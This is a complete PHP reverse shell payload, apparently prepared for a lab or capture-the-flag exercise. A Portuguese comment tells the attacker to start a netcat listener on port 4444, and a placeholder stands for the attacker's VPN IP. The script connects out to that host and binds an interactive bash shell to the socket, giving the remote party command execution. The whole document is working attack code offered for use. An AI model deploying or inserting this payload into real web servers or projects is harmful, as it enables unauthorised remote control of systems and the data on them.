
// Na maquina atacante: nc -lvnp 4444
<?php
$ip = "SEU_IP_DA_VPN";
$port = 4444;

$sock = fsockopen($ip, $port);
$proc = proc_open("/bin/bash -i", [
    0 => $sock,
    1 => $sock,
    2 => $sock
], $pipes);
?>